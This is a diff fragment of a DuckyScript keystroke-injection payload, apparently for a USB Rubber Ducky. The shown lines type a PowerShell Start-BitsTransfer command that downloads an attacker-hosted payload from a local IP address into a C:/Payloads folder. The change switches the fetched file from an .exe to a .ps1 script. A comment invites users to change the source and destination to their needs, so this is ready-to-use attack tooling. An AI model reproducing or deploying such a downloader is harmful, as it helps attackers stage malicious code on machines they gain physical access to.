@@ -67,7 +67,7 @@ STRING cd C:/Payloads
 ENTER
 REM Downloads specified payload from URI
 REM Change source and destination to your needs
-STRING Start-BitsTransfer -Source http://192.168.171.136/payload.exe  -Destination ./payload.exe
+STRING Start-BitsTransfer -Source http://192.168.171.136/payload.ps1  -Destination ./payload.ps1
 ENTER
 STRING exit
 ENTER
